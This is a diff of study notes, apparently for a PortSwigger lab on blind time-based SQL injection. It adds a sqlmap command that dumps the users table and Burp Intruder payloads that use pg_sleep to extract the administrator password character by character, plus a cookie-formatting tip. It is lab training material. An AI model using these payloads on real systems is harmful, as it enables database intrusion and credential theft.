@@ -325,14 +325,24 @@ Ctrl+C on sqlmap could potentially give admin creds in this case, but not always
 
 alt.:
 
-python3 sqlmap.py -u "https://0a9c002e03dfd3d0821afb9f00150064.web-security-academy.net" --cookie="TrackingId=1" -p "TrackingId" --flush-session -batch --level 3 -T users --dump
+python3 sqlmap.py -u "https://0a9c002e03dfd3d0821afb9f00150064.web-security-academy.net" --cookie="TrackingId=1" -p "TrackingId" --flush-session --batch --level 3 -T users --dump
 
-alt. (intruder-be):
+alt. (to intruder, most reliable solution):
 
 x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='§a§')+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users--
 x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,2,1)='§a§')+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users--
 x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,3,1)='§a§')+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users--
-...
+_____
+
+
+for sqlmap, --level is very fontos!
+
+if intruder is not good, then it is most likely because of a \n at the end of the query in the cookie:
+so Cookie: Trid=x;
+session=y
+should be
+Cookie: Trid=x; session=y
+instead.
 
 <!-- omit in toc -->
 ### Solution
